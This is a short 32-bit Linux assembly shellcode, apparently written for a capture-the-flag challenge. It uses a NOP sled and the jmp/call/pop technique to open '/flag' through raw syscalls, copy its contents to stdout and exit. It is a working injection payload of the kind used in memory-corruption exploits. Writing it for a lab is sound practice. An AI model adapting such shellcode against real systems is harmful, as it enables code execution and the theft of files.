	nop
	nop
	nop
	nop

.global main
main:
	jmp	loadpath

openfile:
	pop	%ebx

	/* open the flag file */
	xor	%ecx, %ecx
	xor	%eax, %eax
	movb	$5, %al
	int	$0x80

	/* store off the returned fd */
	movl	%eax, %edi

	/* make room for a 1 byte buffer */
	push	%eax
	movl	%esp, %esi

	/* setup the 3rd and 4th args, they don't change */
	xor	%edx, %edx
	inc	%edx
	movl	%esi, %ecx

	jmp	read

write:
	/* write 1 byte to stdout */
	xor	%ebx, %ebx
	inc	%ebx
	xor	%eax, %eax
	movb	$4, %al
	int	$0x80

read:
	/* read 1 byte from the file */
	movl	%edi, %ebx
	xor	%eax, %eax
	movb	$3, %al
	int	$0x80

	/* jump to write if 1 byte was read */
	dec	%eax
	jz	write

done:
	pop	%eax

	xor	%ebx, %ebx
	xor	%eax, %eax
	movb	$1, %al
	int	$0x80

loadpath:
	call	openfile
	.asciz	"/flag"
